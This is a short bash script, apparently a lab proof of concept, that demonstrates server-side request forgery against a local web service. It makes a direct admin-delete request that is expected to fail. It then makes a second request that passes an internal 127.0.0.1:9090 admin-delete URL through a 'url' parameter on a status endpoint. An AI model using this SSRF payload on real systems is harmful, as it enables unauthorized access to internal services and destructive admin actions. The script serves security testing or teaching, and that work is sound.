#!/usr/bin/env bash

echo "=== 1. Direct access to admin (should fail) ==="
echo "$ curl -s http://localhost:8080/admin/delete?id=1"
curl -s --max-time 3 "http://localhost:8080/admin/delete?id=1"
echo ""

echo ""
echo "=== 2. SSRF access to admin (should reach internal server) ==="
echo '$ curl -s "http://localhost:8080/api/v1/proveedor/status?url=http://127.0.0.1:9090/admin/delete?id=1"'
curl -s --max-time 5 "http://localhost:8080/api/v1/proveedor/status?url=http://127.0.0.1:9090/admin/delete?id=1"
echo ""
